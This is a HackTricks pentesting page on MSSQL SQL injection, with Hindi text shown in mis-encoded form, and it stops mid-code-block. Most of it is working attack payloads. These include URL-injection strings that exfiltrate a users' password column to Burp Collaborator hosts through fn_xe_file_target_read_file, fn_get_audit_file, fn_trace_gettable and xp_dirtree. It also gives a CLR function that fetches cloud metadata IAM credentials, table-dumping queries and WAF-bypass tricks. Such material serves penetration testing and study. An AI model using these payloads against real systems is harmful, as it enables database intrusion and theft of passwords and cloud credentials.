# MSSQL рдЗрдВрдЬреЗрдХреНрд╢рди

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

## Active Directory рдПрдиреНрдпреБрдорд░реЗрд╢рди

MSSQL рд╕рд░реНрд╡рд░ рдХреЗ рдЕрдВрджрд░ SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдбреЛрдореЗрди рдпреВрдЬрд░реНрд╕ рдХрд╛ рдПрдиреНрдпреБрдорд░реЗрд╢рди** рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд MSSQL рдлрдВрдХреНрд╢рдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:

* **`SELECT DEFAULT_DOMAIN()`**: рд╡рд░реНрддрдорд╛рди рдбреЛрдореЗрди рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: рдпрджрд┐ рдЖрдк рдбреЛрдореЗрди рдХрд╛ рдирд╛рдо рдЬрд╛рдирддреЗ рд╣реИрдВ (_DOMAIN_ рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ) рддреЛ рдпрд╣ рдлрдВрдХреНрд╢рди **рдпреВрдЬрд░ Administrator рдХрд╛ SID** рд╣реЗрдХреНрд╕ рдлреЙрд░реНрдореЗрдЯ рдореЗрдВ рд▓реМрдЯрд╛рдПрдЧрд╛. рдпрд╣ рджрд┐рдЦреЗрдЧрд╛ `0x01050000000[...]0000f401`, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдЕрдВрддрд┐рдо 4 рдмрд╛рдЗрдЯреНрд╕** рдирдВрдмрд░ **500** рд╣реИрдВ **big endian** рдлреЙрд░реНрдореЗрдЯ рдореЗрдВ, рдЬреЛ рдХрд┐ **рдпреВрдЬрд░ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдХрд╛ рд╕рд╛рдорд╛рдиреНрдп ID** рд╣реИ.\
рдпрд╣ рдлрдВрдХреНрд╢рди рдЖрдкрдХреЛ **рдбреЛрдореЗрди рдХрд╛ ID рдЬрд╛рдирдиреЗ** рдореЗрдВ рдорджрдж рдХрд░реЗрдЧрд╛ (рдЕрдВрддрд┐рдо 4 рдмрд╛рдЗрдЯреНрд╕ рдХреЛ рдЫреЛрдбрд╝рдХрд░).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : рдпрд╣ рдлрдВрдХреНрд╢рди **рдЗрдВрдбрд┐рдХреЗрдЯреЗрдб ID рдХрд╛ рдпреВрдЬрд░рдиреЗрдо** рд▓реМрдЯрд╛рдПрдЧрд╛ (рдпрджрд┐ рдХреЛрдИ рд╣реЛ), рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **0000e803** big endian рдореЗрдВ == **1000** (рдЖрдорддреМрд░ рдкрд░ рдпрд╣ рдкрд╣рд▓реЗ рдирд┐рдпрдорд┐рдд рдпреВрдЬрд░ ID рдХрд╛ рд╣реЛрддрд╛ рд╣реИ). рдлрд┐рд░ рдЖрдк рдХрд▓реНрдкрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк 1000 рд╕реЗ 2000 рддрдХ рдпреВрдЬрд░ IDs рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╢рд╛рдпрдж рдбреЛрдореЗрди рдХреЗ рд╕рднреА рдпреВрдЬрд░реНрд╕ рдХреЗ рдпреВрдЬрд░рдиреЗрдо рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ. рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **рд╡реИрдХрд▓реНрдкрд┐рдХ рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд рд╡реЗрдХреНрдЯрд░реНрд╕**

рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдЖрдорддреМрд░ рдкрд░ `+AND+1=@@version--` рдЬреИрд╕реЗ рдирд┐рд░реНрдорд╛рдгреЛрдВ рдХреЗ рд╕рдорд╛рди рджрд┐рдЦрддреЗ рд╣реИрдВ рдФрд░ ┬лOR┬╗ рдСрдкрд░реЗрдЯрд░ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╡рд┐рд╡рд┐рдзрддрд╛рдПрдВ рд╣реЛрддреА рд╣реИрдВред рдРрд╕реЗ рдПрдХреНрд╕рдкреНрд░реЗрд╢рди рд╡рд╛рд▓реА рдХреНрд╡реЗрд░реАрдЬрд╝ рдХреЛ рдЖрдорддреМрд░ рдкрд░ WAFs рджреНрд╡рд╛рд░рд╛ рдмреНрд▓реЙрдХ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдмрд╛рдИрдкрд╛рд╕ рдХреЗ рд░реВрдк рдореЗрдВ, %2b рдХреИрд░реЗрдХреНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрдВрдХреНрд╢рди рдХреЙрд▓реНрд╕ рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝реЗрдВ рдЬреЛ рд╡рд╛рдВрдЫрд┐рдд рдбреЗрдЯрд╛ рдкрд░ рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рд╡рд░реНрддрди рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред

рдРрд╕реЗ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

рдлрдВрдХреНрд╢рди `USER_NAME()` рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЙрдкрдпреЛрдЧ:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
## SSRF

### `fn_xe_file_target_read_file`
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**рдЕрдиреБрдорддрд┐рдпрд╛рдБ:** рд╕рд░реНрд╡рд░ рдкрд░ **`VIEW SERVER STATE`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**рдЕрдиреБрдорддрд┐рдпрд╛рдБ:** **`CONTROL SERVER`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettable`
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**рдЕрдиреБрдорддрд┐рдпрд╛рдБ:** **`CONTROL SERVER`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

MSSQL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдЖрдкрдХреЛ рдЬреЛ рд╕рдмрд╕реЗ рдЖрдо рддрд░реАрдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдХреЙрд▓ рдХреЗ рд▓рд┐рдП рдорд┐рд▓реЗрдЧрд╛ рд╡рд╣ рд╣реИ Stored Procedure `xp_dirtree` рдХрд╛ рдЙрдкрдпреЛрдЧ, рдЬреЛ рдЕрдЬреАрдм рддрд░рд╣ рд╕реЗ Microsoft рджреНрд╡рд╛рд░рд╛ рдЕрдирджрд╕реНрддрд╛рд╡реЗрдЬрд┐рдд рд╣реИ, рдЬрд┐рд╕рдХреЗ рдХрд╛рд░рдг рдЗрд╕реЗ [рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЕрдиреНрдп рд▓реЛрдЧреЛрдВ рджреНрд╡рд╛рд░рд╛ рджрд╕реНрддрд╛рд╡реЗрдЬ рдХрд┐рдпрд╛ рдЧрдпрд╛](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/)ред рдЗрд╕ рдореЗрдердб рдХрд╛ рдЙрдкрдпреЛрдЧ [рдХрдИ рдЙрджрд╛рд╣рд░рдгреЛрдВ](https://www.notsosecure.com/oob-exploitation-cheatsheet/) рдореЗрдВ [Out of Band Data exfiltration](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/) рдкреЛрд╕реНрдЯреНрд╕ рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рд╣реИрдВред

рдореВрд▓ рд░реВрдк рд╕реЗ,
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
MySQL рдХреЗ `LOAD_FILE` рдХреА рддрд░рд╣, рдЖрдк `xp_dirtree` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреЗрд╡рд▓ TCP рдкреЛрд░реНрдЯ 445** рдкрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ, рд▓реЗрдХрд┐рди рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░реНрд╕ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

**PS:** рдпрд╣ `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` рдкрд░ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХрд┐ `Windows Server 2016 Datacenter` рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реЛред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ **рдЕрдиреНрдп** рд╕рдВрдЧреНрд░рд╣рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ [**`master..xp_fileexist`**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx) рдпрд╛ **`xp_subdirs`** рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдорд╛рди рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЖрдк **`xp_cmdshell`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрд┐ **SSRF** рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рдЕрдиреБрднрд╛рдЧ рдкрдврд╝реЗрдВ**:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

рдпрд╣ рдХрд╛рдлреА рд╕рд░рд▓ рд╣реИ рдХрд┐ рдПрдХ **CLR UDF** (Common Language Runtime User Defined Function - рдХрд┐рд╕реА рднреА **.NET** рднрд╛рд╖рд╛ рдореЗрдВ рд▓рд┐рдЦрд┐рдд рдХреЛрдб рдЬреЛ рдХрд┐ рдПрдХ **DLL** рдореЗрдВ рд╕рдВрдХрд▓рд┐рдд рд╣реЛрддрд╛ рд╣реИ) рд▓рд┐рдЦреЗрдВ рдФрд░ **MSSQL рдореЗрдВ рдХрд╕реНрдЯрдо рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рд▓реЛрдб рдХрд░реЗрдВ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕рдХреЗ рд▓рд┐рдП **`dbo` рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ** рдЗрд╕рд▓рд┐рдП рдпрд╣ рддрдм рддрдХ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рдЬрдм рддрдХ рдХрд┐ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ **`sa` рдпрд╛ рдПрдХ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рд░реЛрд▓ рдХреЗ рд░реВрдк рдореЗрдВ** рдХрдиреЗрдХреНрдЯ рди рд╣реЛред

[рдЗрд╕ Github рд░реЗрдкреЛ рдореЗрдВ Visual Studio рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдФрд░ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдирд┐рд░реНрджреЗрд╢ рд╣реИрдВ](https://github.com/infiniteloopltd/SQLHttp) рдЬреЛ MSSQL рдореЗрдВ CLR рдЕрд╕реЗрдВрдмрд▓реА рдХреЗ рд░реВрдк рдореЗрдВ рдмрд╛рдЗрдирд░реА рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдФрд░ рдлрд┐рд░ MSSQL рдХреЗ рднреАрддрд░ рд╕реЗ HTTP GET рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВред

`http.cs` рдХреЛрдб `WebClient` рдХреНрд▓рд╛рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ GET рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
рд╕реНрдерд╛рдкрдирд╛ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдореЗрдВ, `CREATE ASSEMBLY` рдХреНрд╡реЗрд░реА рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд▓рд╛рдПрдВ рддрд╛рдХрд┐ рдЕрд╕реЗрдВрдмрд▓реА рдХреЗ SHA512 рд╣реИрд╢ рдХреЛ рд╕рд░реНрд╡рд░ рдкрд░ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЕрд╕реЗрдВрдмрд▓реАрдЬрд╝ рдХреА рд╕реВрдЪреА рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХреЗ (рдЖрдк рд╕реВрдЪреА рдХреЛ `select * from sys.trusted_assemblies;` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ)
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
рдПрдХ рдмрд╛рд░ рдЕрд╕реЗрдВрдмрд▓реА рдЬреЛрдбрд╝ рджреА рдЬрд╛рддреА рд╣реИ рдФрд░ рдлрдВрдХреНрд╢рди рдмрдирд╛ рд▓рд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдХрд░ рд╣рдорд╛рд░реЗ HTTP рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
## **рддреНрд╡рд░рд┐рдд рд╢реЛрд╖рдг: рдПрдХ рдХреНрд╡реЗрд░реА рдореЗрдВ рдкреВрд░реА рддрд╛рд▓рд┐рдХрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**

рдПрдХ рдХреНрд╡реЗрд░реА рдореЗрдВ рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рдХреА рдкреВрд░реА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рджреЛ рд╕рд░рд▓ рддрд░реАрдХреЗ рд╣реИрдВ тАФ FOR XML рдпрд╛ FOR JSON рдЦрдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧред FOR XML рдЦрдВрдб рдХреЛ рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдореЛрдб рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ рдХрд┐ ┬лraw┬╗, рдЗрд╕рд▓рд┐рдП рд╕рдВрдХреНрд╖рд┐рдкреНрддрддрд╛ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ FOR JSON рдЗрд╕реЗ рдкреНрд░рджрд░реНрд╢рди рдореЗрдВ рдорд╛рдд рджреЗрддрд╛ рд╣реИред

рд╡рд░реНрддрдорд╛рди рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рд╕реНрдХреАрдорд╛, рддрд╛рд▓рд┐рдХрд╛рдПрдВ рдФрд░ рдХреЙрд▓рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд╡реЗрд░реА:
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

Error-based рд╡реЗрдХреНрдЯрд░реНрд╕ рдХреЛ рдПрдХ рдЙрдкрдирд╛рдо рдпрд╛ рдирд╛рдо рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдмрд┐рдирд╛ рдЗрдирдХреЗ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХрд╛ рдкрд░рд┐рдгрд╛рдо JSON рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрд╡рд░реВрдкрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ред
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **рд╡рд░реНрддрдорд╛рди рдХреНрд╡реЗрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛**

рд╡рд░реНрддрдорд╛рди SQL рдХреНрд╡реЗрд░реА рдЬреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд░рд╣реА рд╣реИ, `sys.dm_exec_requests` рдФрд░ `sys.dm_exec_sql_text` рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
**рдЕрдиреБрдорддрд┐рдпрд╛рдБ:** рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рд╕рд░реНрд╡рд░ рдкрд░ VIEW SERVER STATE рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ SQL Server рдХреЗ рдЙрджрд╛рд╣рд░рдг рдкрд░ рд╕рднреА рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╕рддреНрд░реЛрдВ рдХреЛ рджреЗрдЦреЗрдЧрд╛; рдЕрдиреНрдпрдерд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ рд╡рд░реНрддрдорд╛рди рд╕рддреНрд░ рдХреЛ рджреЗрдЦреЗрдЧрд╛ред
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **WAF рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рд▓рд┐рдП рдЫреЛрдЯреА рдЪрд╛рд▓реЗрдВ**

рдЧреИрд░-рдорд╛рдирдХ рд╕рдлреЗрдж рд╕реНрдерд╛рди рд╡рд░реНрдг: %C2%85 рдпрд╛ %C2%A0:
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
рдпреВрдирд┐рдпрди рдХреЛ рдЕрд╕реНрдкрд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реИрдЬреНрдЮрд╛рдирд┐рдХ (0e) рдФрд░ рд╣реЗрдХреНрд╕ (0x) рдиреЛрдЯреЗрд╢рди:
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
FROM рдХреЗ рдмрд╛рдж рдХреЙрд▓рдо рдирд╛рдо рдХреЗ рдмреАрдЪ рдореЗрдВ рд╡реНрд╣рд╛рдЗрдЯрд╕реНрдкреЗрд╕ рдХреА рдЬрдЧрд╣ рдкреАрд░рд┐рдпрдб:
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
SELECT рдФрд░ рдПрдХ рдлреЗрдВрдХрдиреЗ рдпреЛрдЧреНрдп рдХреЙрд▓рдо рдХреЗ рдмреАрдЪ \N рд╡рд┐рднрд╛рдЬрдХ:
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
### WAF рдХреЛ рдЕрдкрд░рдВрдкрд░рд╛рдЧрдд рд╕реНрдЯреИрдХреНрдб рдХреНрд╡реЗрд░реАрдЬрд╝ рдХреЗ рд╕рд╛рде рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛

[**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, MSSQL рдореЗрдВ ";" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рдХреНрд╡реЗрд░реАрдЬрд╝ рдХреЛ рд╕реНрдЯреИрдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХрд╛рдзрд┐рдХ рдХреНрд╡реЗрд░реАрдЬрд╝ рдЬреИрд╕реЗ рдХрд┐:
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
рдХреЛ рдХрдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```sql
